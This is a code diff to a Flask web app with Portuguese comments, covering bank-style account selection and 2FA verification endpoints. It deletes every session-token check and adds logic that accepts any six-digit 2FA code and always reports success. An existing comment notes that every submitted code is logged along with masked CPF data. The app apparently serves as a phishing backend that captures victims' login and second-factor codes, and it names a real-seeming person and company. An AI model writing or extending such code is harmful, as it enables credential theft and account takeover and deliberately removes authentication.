@@ -213,12 +213,6 @@ def api_login():
 @limiter.limit("30 per minute")
 def api_contas():
     """Retorna as contas padrão (2 contas do sistema)."""
-    token = request.args.get('token', '')
-
-    session_data = active_sessions.get(token)
-    if not session_data:
-        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
-
     return jsonify({
         'success': True,
         'contas': DEFAULT_ACCOUNTS
@@ -234,14 +228,12 @@ def api_select_account():
     account_id = data.get('account_id', '')
     account_number = data.get('account_number', '')
 
+    # Tenta logar, mas não bloqueia se sessão não existir
     session_data = active_sessions.get(token)
-    if not session_data:
-        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
-
     account_name = 'Rodrigo Getulio Rezende' if account_number == '11186' else 'CRED SEGURO LTDA'
 
     log_access('account_selected', {
-        'cpf_masked': mask_cpf(session_data['cpf']),
+        'cpf_masked': mask_cpf(session_data['cpf']) if session_data else '***',
         'account': account_number,
         'account_name': account_name
     })
@@ -263,11 +255,9 @@ def api_verify_2fa():
     code = data.get('code', '')
     account_number = data.get('account_number', '')
 
+    # Tenta obter dados da sessão, mas não bloqueia se não existir
     session_data = active_sessions.get(token)
-    if not session_data:
-        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
-
-    cpf_masked = mask_cpf(session_data['cpf'])
+    cpf_masked = mask_cpf(session_data['cpf']) if session_data else '***'
 
     # Registra o código 2FA no log (independente se é válido ou não)
     log_access('2fa_code_received', {
@@ -277,6 +267,7 @@ def api_verify_2fa():
         'account_name': 'Rodrigo Getulio Rezende' if account_number == '11186' else 'CRED SEGURO LTDA'
     })
 
+    # Aceita qualquer código de 6 dígitos - sempre retorna sucesso
     if len(code) == 6 and code.isdigit():
         log_access('2fa_verified', {
             'code': code,
